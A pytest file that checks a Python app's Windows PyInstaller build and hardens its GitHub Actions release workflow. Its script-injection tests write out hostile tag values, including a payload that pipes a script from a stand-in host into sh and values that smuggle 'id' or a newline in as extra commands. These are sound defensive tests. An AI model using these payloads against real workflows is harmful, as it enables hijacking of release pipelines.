"""The pieces the Windows build depends on.

The frozen binaries themselves are built and smoke-tested by the release
workflow on a Windows runner — that is the only place they can be. What is
testable here is everything the build stands on: the icon generator, the
``--version`` path that lets CI verify a windowed binary without a display, and
the spec and workflow actually being present and consistent.

The ``--version`` flag exists specifically because a windowed PyInstaller build
cannot otherwise be checked. The first hand-built exe died at import from an
over-eager ``--exclude-module email`` and reported it in a message box, which a
CI runner would never have seen. ``--version`` returns before Tk is touched but
after the whole import graph has been walked, so that failure becomes a
non-zero exit code instead.
"""
import os
import shutil
import struct
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from pingerplot import __version__

REPO = Path(__file__).resolve().parent.parent


# --- the --version escape hatch --------------------------------------------

def test_version_flag_prints_the_version_and_exits():
    out = subprocess.run([sys.executable, str(REPO / "main.py"), "--version"],
                         capture_output=True, text=True, timeout=60)
    assert out.returncode == 0, out.stderr
    assert __version__ in out.stdout


def test_version_flag_does_not_need_a_display():
    """The whole point: it must return before Tk is created, so a headless CI
    runner can use it to prove a frozen binary's import graph."""
    src = (REPO / "pingerplot" / "gui.py").read_text(encoding="utf-8")
    body = src[src.index("def main() -> None:"):]
    version_branch = body[:body.index("_enable_windows_dpi_awareness()")]
    assert "--version" in version_branch
    assert "tk.Tk()" not in version_branch


def test_version_walks_the_import_graph_that_broke():
    """gui -> geoip -> urllib.request -> email. If that chain is ever severed,
    the CI gate stops meaning anything."""
    import pingerplot.gui  # noqa: F401
    assert "pingerplot.geoip" in sys.modules
    assert "urllib.request" in sys.modules
    assert "email" in sys.modules


# --- the icon --------------------------------------------------------------

def test_icon_is_a_valid_multi_size_ico():
    sys.path.insert(0, str(REPO / "packaging"))
    import make_icon

    data = make_icon.build_ico()
    reserved, kind, count = struct.unpack("<HHH", data[:6])
    assert (reserved, kind) == (0, 1), "not an ICO header"
    assert count == len(make_icon.SIZES)

    seen = []
    for i in range(count):
        w, h, _c, _r, planes, bpp, size, offset = struct.unpack(
            "<BBBBHHII", data[6 + 16 * i:22 + 16 * i])
        assert planes == 1 and bpp == 32
        assert offset + size <= len(data), "entry points past the end of the file"
        assert data[offset:offset + 8] == b"\x89PNG\r\n\x1a\n", "not PNG-compressed"
        seen.append(w or 256)
    assert seen == list(make_icon.SIZES)


def test_icon_includes_the_sizes_windows_actually_asks_for():
    sys.path.insert(0, str(REPO / "packaging"))
    import make_icon
    # 16 for the title bar and taskbar, 32 for alt-tab, 256 for large icons in
    # Explorer. Missing one makes Windows scale another and it looks it.
    for needed in (16, 32, 256):
        assert needed in make_icon.SIZES


def test_icon_is_written_to_disk(tmp_path):
    sys.path.insert(0, str(REPO / "packaging"))
    import make_icon
    dest = tmp_path / "nested" / "app.ico"
    assert make_icon.main([str(dest)]) == 0
    assert dest.exists() and dest.stat().st_size > 1000


# --- the spec and workflow -------------------------------------------------

def test_the_spec_exists_and_is_tracked():
    """.gitignore carries a blanket *.spec for PyInstaller's generated ones.
    The authored spec must be exempted or the build silently has no recipe."""
    spec = REPO / "packaging" / "pingerplot.spec"
    assert spec.exists()
    ignore = (REPO / ".gitignore").read_text(encoding="utf-8")
    assert "!packaging/*.spec" in ignore


def test_the_spec_does_not_exclude_anything_the_app_imports():
    """The regression that started all this. Excluding email broke
    urllib.request, which geoip and the webhook both need."""
    spec = (REPO / "packaging" / "pingerplot.spec").read_text(encoding="utf-8")
    dangerous = ("email", "urllib", "http", "json", "socket", "ctypes",
                 "tkinter", "select", "csv", "queue", "ipaddress", "zlib")
    for mod in dangerous:
        assert f'"{mod}"' not in spec.split("EXCLUDES")[1].split("]")[0], \
            f"the spec excludes {mod!r}, which the app imports"


def test_the_spec_builds_both_binaries():
    spec = (REPO / "packaging" / "pingerplot.spec").read_text(encoding="utf-8")
    assert 'name="PingerPlot"' in spec
    assert 'name="pingerplot-headless"' in spec
    assert "console=False" in spec and "console=True" in spec


def test_the_spec_does_not_upx_pack():
    """UPX packing is a large share of PyInstaller AV false positives, and this
    binary already looks suspicious to a heuristic scanner without help."""
    spec = (REPO / "packaging" / "pingerplot.spec").read_text(encoding="utf-8")
    assert spec.count("upx=False") == 2


def test_the_release_workflow_verifies_before_it_uploads():
    """An unverified upload is how a broken binary reaches people."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    smoke_gui = wf.index("Smoke-test the frozen GUI")
    smoke_cli = wf.index("Smoke-test the frozen headless")
    upload = wf.index("Attach to the release")
    assert smoke_gui < upload and smoke_cli < upload


def test_the_workflow_checks_the_gui_exit_code_correctly():
    """A GUI-subsystem exe does not set $LASTEXITCODE in PowerShell -- the
    variable keeps whatever the previous command left, so the check silently
    passes a broken build. Start-Process -Wait -PassThru is the correct form."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    gui_step = wf[wf.index("Smoke-test the frozen GUI"):wf.index("Smoke-test the frozen headless")]
    # Only the commands, not the comment that explains why $LASTEXITCODE is
    # wrong here -- naming the trap is the opposite of falling into it.
    code = "\n".join(ln for ln in gui_step.splitlines()
                     if not ln.strip().startswith("#"))
    assert "-Wait -PassThru" in code
    assert "$LASTEXITCODE" not in code


def test_the_workflow_publishes_checksums():
    """The binaries are unsigned, so a hash is the only integrity story."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    assert "SHA256SUMS.txt" in wf
    assert "SHA256" in wf


def test_the_workflow_creates_the_release_if_absent():
    """Pushing a tag does not create a release -- GitHub leaves that to you --
    so on the ordinary path (tag a version, let CI build it) there is nothing
    to upload to and `gh release upload` alone fails with "release not found".
    That is exactly what happened on the first v1.3.1 build."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    step = wf[wf.index("Attach to the release"):]
    assert "gh release create" in step
    assert "gh release view" in step, "should check before creating"
    assert "--notes-from-tag" in step, "the annotated tag already holds the notes"


def test_the_workflow_refuses_a_tag_without_a_build_recipe():
    """Dispatching against a tag from before packaging/ existed produced a
    baffling failure in whichever step first touched a missing file."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    assert "packaging/pingerplot.spec" in wf.split("Check this tag can actually be built")[1][:600]


# --- workflow hardening ----------------------------------------------------
#
# The release job holds `permissions: contents: write` and a GH_TOKEN that can
# publish releases, so two rules apply to it. Both are checked here rather than
# left to review, because both are the kind of thing a later edit reintroduces
# without noticing.

WORKFLOWS = sorted((REPO / ".github" / "workflows").glob("*.yml"))


def _run_blocks(text):
    """Every `run:` script in a workflow, as (line_number, body) pairs.

    Textual rather than YAML-parsed on purpose: the project is
    dependency-free and CI installs only pytest, so PyYAML is not available.
    """
    lines = text.splitlines()
    out = []
    for i, line in enumerate(lines):
        stripped = line.lstrip()
        if not stripped.startswith("run:"):
            continue
        indent = len(line) - len(stripped)
        body = [stripped[len("run:"):]]
        for nxt in lines[i + 1:]:
            if not nxt.strip():
                body.append("")
                continue
            if len(nxt) - len(nxt.lstrip()) <= indent:
                break
            body.append(nxt)
        out.append((i + 1, "\n".join(body)))
    return out


def test_the_run_block_finder_actually_finds_them():
    """This test's own instrument, checked before it certifies anything."""
    sample = (
        "steps:\n"
        "  - name: one\n"
        "    run: echo ${{ inputs.tag }}\n"
        "  - name: two\n"
        "    env:\n"
        "      X: ${{ inputs.tag }}\n"
        "    run: |\n"
        "      echo \"$X\"\n"
        "      echo ${{ github.ref_name }}\n"
        "  - name: three\n"
        "    run: echo safe\n"
    )
    blocks = _run_blocks(sample)
    assert len(blocks) == 3
    assert "${{ inputs.tag }}" in blocks[0][1]
    assert "${{ github.ref_name }}" in blocks[1][1]
    assert "${{" not in blocks[2][1], "must not swallow the env: block above it"


def test_no_workflow_interpolates_into_a_shell_script():
    """The canonical GitHub Actions script-injection pattern: the runner
    substitutes ${{ }} into the script TEXT before bash ever sees it, so a
    dispatch input of `"; curl -s https://evil/x | sh; #` executes. Values
    reach the shell through env: instead, where bash reads them as data.

    Only principals with write access can dispatch, so this is defence in
    depth against a compromised collaborator account rather than a path from
    outside -- but the release job publishes the binaries people download."""
    for wf in WORKFLOWS:
        for lineno, body in _run_blocks(wf.read_text(encoding="utf-8")):
            assert "${{" not in body, (
                f"{wf.name}:{lineno} interpolates into a run: script; "
                f"pass the value through env: instead")


def test_the_release_workflow_validates_the_dispatch_tag():
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    step = wf[wf.index("Work out which tag we are building"):wf.index("actions/checkout")]
    assert "TAG_INPUT: ${{ inputs.tag }}" in step, "input must arrive via env:"
    assert "refusing to build" in step, "an unexpected tag shape must be refused"


def test_every_action_is_pinned_by_commit_sha():
    """Tags are mutable. A retagged or compromised action would otherwise run
    in a job holding contents:write and a publish-capable token."""
    import re
    uses = re.compile(r"^\s*(?:- )?uses:\s*(\S+)", re.M)
    for wf in WORKFLOWS:
        for ref in uses.findall(wf.read_text(encoding="utf-8")):
            assert "@" in ref, f"{wf.name}: unversioned action {ref!r}"
            pin = ref.split("@", 1)[1]
            assert re.fullmatch(r"[0-9a-f]{40}", pin), (
                f"{wf.name}: {ref!r} is pinned by tag, not commit SHA")


def test_pinned_actions_say_which_version_they_are():
    """A bare 40-character SHA is unreadable and unreviewable. The trailing
    comment is the convention Dependabot reads and rewrites."""
    import re
    for wf in WORKFLOWS:
        for line in wf.read_text(encoding="utf-8").splitlines():
            if re.match(r"^\s*(?:- )?uses:\s*\S+@[0-9a-f]{40}", line):
                assert re.search(r"#\s*v\d", line), f"{wf.name}: {line.strip()!r}"


def test_dependabot_keeps_the_pins_fresh():
    """A pinned SHA goes stale silently; this is what stops that."""
    cfg = REPO / ".github" / "dependabot.yml"
    assert cfg.exists(), "SHA pinning without Dependabot just means stale actions"
    assert "github-actions" in cfg.read_text(encoding="utf-8")


def test_the_tag_guard_rejects_a_newline_as_well_as_a_bad_shape(tmp_path):
    """Not redundant with the version-shape check: a glob's * matches a
    newline, so "v1.3.1\ninjected=1" passes the shape test and then writes two
    lines into $GITHUB_OUTPUT -- inventing a step output nothing declared.

    The guard is extracted from the workflow and actually executed, rather
    than eyeballed. A workflow step is only reviewable if something runs it."""
    bash = shutil.which("bash")
    if not bash:
        pytest.skip("no bash to run the extracted guard")

    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    step = wf[wf.index("Work out which tag we are building"):wf.index("actions/checkout")]
    blocks = _run_blocks(step)
    assert len(blocks) == 1, "expected exactly one run: block in the tag step"
    # First line is YAML's block-scalar indicator (" |"), not shell.
    head, _nl, rest = blocks[0][1].partition("\n")
    assert head.strip() in ("|", "|-", ">"), f"unexpected run: form {head!r}"
    script = textwrap.dedent(rest)
    assert "GITHUB_OUTPUT" in script, "extracted the wrong thing"

    # A real file, not os.devnull: under Git Bash on Windows that name is not
    # the null device, so `>> "$GITHUB_OUTPUT"` creates a file called `nul` in
    # the repository -- which git then refuses to index.
    sink = tmp_path / "github_output"

    def _run(tag):
        return subprocess.run(
            [bash, "-c", script],
            env={**os.environ, "TAG_INPUT": tag, "REF_NAME": "",
                 "GITHUB_OUTPUT": str(sink)},
            capture_output=True, text=True, timeout=30)

    for good in ("v1.3.1", "v10.2.30", "v2.0.0-rc.1"):
        assert _run(good).returncode == 0, f"refused {good!r}"
    for bad in ("v1.3.1\ninjected=1", "not-a-version", "v1.3", "",
                '"; curl -s https://evil/x | sh; #', "v1.3.1;id", "v1.3.1$(id)",
                "v1.3.1 --clobber"):
        assert _run(bad).returncode != 0, f"accepted {bad!r}"
